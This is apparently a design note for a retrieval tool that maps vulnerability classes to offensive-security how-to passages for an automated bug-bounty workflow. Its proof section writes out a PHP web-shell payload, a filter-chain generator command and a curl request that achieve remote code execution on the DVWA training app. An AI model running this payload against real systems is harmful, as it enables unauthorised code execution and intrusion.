---
title: "Technique router — class → named technique → passage → payload"
type: design
built: "2026-11-17"
status: "shipped and proven on DVWA (filter-chain RCE)"
---

# Technique router

## Why it exists

DVWA pass 3 measured the failure precisely: a query with the **class** name returned skill frontmatter,
a query with the **technique** name returned the how-to at rank 1.

```
"file inclusion"                      → skills/hunt-lfi/SKILL.md (frontmatter, no steps)
"php filter chain iconv RCE no upload"→ hunt-lfi § "Phase 4 — PHP Filter-Chain → RCE"   (rank 1)
```

The index was fine. The question was too coarse. The router removes that dependence on phrasing.

## What it is

`techniques` table — 1,409 rows, each `(name, class, chunk_id, path, confidence)`.

| Field | Meaning |
|---|---|
| name | the section heading as written by the author ("PHP Filter-Chain → RCE (no upload, no writable file)") |
| cls | LFI · SQLI · XSS · SSRF · IDOR · RCE · UPLOAD · AUTH · ACL · CSRF · CRYPTO · CONF · INJ · DOS · LOGIC |
| chunk_id | the passage holding the commands — `vault_get_chunk(55708)` |
| confidence | `path` (skill folder names the class — 628 rows) or `kw` (heading keywords only — 781 rows) |

Built from 51,542 doc headings, then filtered: technique vocabulary required, noise headings dropped
("Related Skills", "Anti-Patterns", "Blogs Index", case IDs, shell commands, URLs), and keyword-only
matches must contain a strong technique word (bypass / payload / table / → / poison / wrapper / …).

## Tools

```bash
python3 techniques.py LFI              # list
python3 techniques.py SQLI --grep union
python3 techniques.py --show 55708     # read the how-to passage
```
MCP: `vault_techniques(class, query, k)` → names + chunk ids; `vault_get_chunk(chunk_id)` → the passage.
`vault_plan(feature)` now appends "TECHNIQUES to actually run" for the top classes it found.

## Proof it closes the measured gap

Pass 3 never tested filter-chain RCE because the query never named it. This pass:

```
vault_plan("page include parameter and file upload in a PHP app")
  → TECHNIQUES: [LFI] PHP Filter-Chain → RCE (chunk 55708), Symlink Alias Bypass (55716), …

python3 /tmp/pfchain/php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'
curl -G ".../vulnerabilities/fi/" --data-urlencode "page=<5797-byte chain>" --data-urlencode "c=id"
→ uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

RCE with **no upload endpoint and no readable log** — the exact primitive the skills file describes and
that pass 3 could not reach by asking for "file inclusion".

Evidence: `~/Bugbounty/dvwa/evidence-rag2/m7_filterchain_rce.html`

## Known limits

- Headings only. Techniques described in prose bullets without a heading are not captured yet
  (next step: mine bullet lines under "Test" checklists, and fenced payload blocks).
- 781 `kw` rows are noisier than the 628 `path` rows; output is ordered path-first for that reason.
- `UPLOAD` has 18 rows because upload doctrine lives mostly in bullet lists, not headings — the payload
  table (sprint 2) is what fixes that class properly.
